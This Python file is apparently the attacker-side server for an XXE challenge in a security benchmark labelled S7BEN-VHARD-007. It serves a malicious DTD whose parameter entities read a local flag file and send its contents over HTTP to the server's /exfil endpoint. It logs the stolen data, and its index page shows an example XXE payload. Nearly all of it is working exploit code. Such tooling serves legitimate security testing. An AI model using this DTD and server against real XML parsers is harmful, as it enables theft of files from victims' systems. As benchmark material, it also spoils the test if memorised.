"""
S7BEN-VHARD-007: DTD Server

This server hosts malicious DTD files for XXE exploitation.
It logs all incoming requests to help track out-of-band data exfiltration.
"""

import os
import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

LOG_FILE = '/logs/dtd_requests.log'


def log_request(message):
    """Log requests to file"""
    os.makedirs('/logs', exist_ok=True)
    timestamp = datetime.datetime.now().isoformat()
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{timestamp}] {message}\n")
    print(f"[DTD-SERVER] {message}")


class DTDHandler(BaseHTTPRequestHandler):
    """HTTP request handler for DTD server"""

    def log_message(self, format, *args):
        """Override to use our logging"""
        log_request(f"{self.address_string()} - {format % args}")

    def do_GET(self):
        """Handle GET requests"""
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        query = parse_qs(parsed_path.query)

        log_request(f"GET {self.path}")

        # Log query parameters (for OOB data exfiltration)
        if query:
            log_request(f"Query Parameters: {query}")
            for key, values in query.items():
                for value in values:
                    log_request(f"  {key} = {value}")

        # Serve different DTD files based on path
        if path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')

        elif path == '/evil.dtd' or path.endswith('.dtd'):
            # Serve malicious DTD file
            dtd_content = self.get_evil_dtd()
            self.send_response(200)
            self.send_header('Content-Type', 'application/xml-dtd')
            self.send_header('Content-Length', str(len(dtd_content)))
            self.end_headers()
            self.wfile.write(dtd_content.encode('utf-8'))
            log_request(f"Served DTD file: {path}")

        elif path == '/':
            # Serve index page
            html = self.get_index_html()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))

        elif path == '/logs':
            # Serve logs
            try:
                with open(LOG_FILE, 'r') as f:
                    logs = f.read()
            except:
                logs = "No logs yet"

            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(logs.encode('utf-8'))

        else:
            self.send_response(404)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'404 Not Found')

    def get_evil_dtd(self):
        """
        Generate malicious DTD for out-of-band XXE exploitation

        This DTD uses parameter entities to exfiltrate data via HTTP request
        """
        dtd = '''<!-- Malicious DTD for XXE Out-of-Band Exfiltration -->

<!-- Define parameter entity that reads sensitive file -->
<!ENTITY % file SYSTEM "file:///app/oob_flag.txt">

<!-- Define parameter entity that sends file content via HTTP -->
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://dtd-server:8888/exfil?data=%file;'>">

<!-- Trigger the exfiltration -->
%eval;
%send;
'''
        return dtd

    def get_index_html(self):
        """Generate index HTML page"""
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>S7BEN-VHARD-007 DTD Server</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            max-width: 900px;
            margin: 50px auto;
            padding: 20px;
            background: #1e1e1e;
            color: #00ff00;
        }
        h1 { color: #ff6b6b; }
        h2 { color: #4ecdc4; }
        code {
            background: #2d2d2d;
            padding: 2px 6px;
            border-radius: 3px;
            color: #ffa500;
        }
        pre {
            background: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <h1>🔓 S7BEN-VHARD-007: DTD Server</h1>

    <h2>Available DTD Files</h2>
    <ul>
        <li><code>GET /evil.dtd</code> - Malicious DTD for OOB exfiltration</li>
        <li><code>GET /logs</code> - View exfiltration logs</li>
        <li><code>GET /health</code> - Health check</li>
    </ul>

    <h2>Example XXE Payload</h2>
    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % dtd SYSTEM "http://dtd-server:8888/evil.dtd"&gt;
  %dtd;
]&gt;
&lt;data&gt;trigger&lt;/data&gt;</pre>

    <h2>How It Works</h2>
    <ol>
        <li>XML parser requests external DTD from this server</li>
        <li>DTD contains parameter entities that read local files</li>
        <li>DTD makes HTTP request back to this server with file content</li>
        <li>Server logs the exfiltrated data</li>
    </ol>

    <p style="text-align:center;margin-top:50px;color:#888;">
        Strike7 Security Benchmarks - Phase 4
    </p>
</body>
</html>'''
        return html


def run_server(port=8888):
    """Start the DTD server"""
    server_address = ('', port)
    httpd = HTTPServer(server_address, DTDHandler)

    print(f"[DTD-SERVER] Starting DTD server on port {port}")
    print(f"[DTD-SERVER] Logs will be saved to: {LOG_FILE}")
    print(f"[DTD-SERVER] Access at: http://localhost:{port}")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[DTD-SERVER] Shutting down...")
        httpd.shutdown()


if __name__ == '__main__':
    run_server()
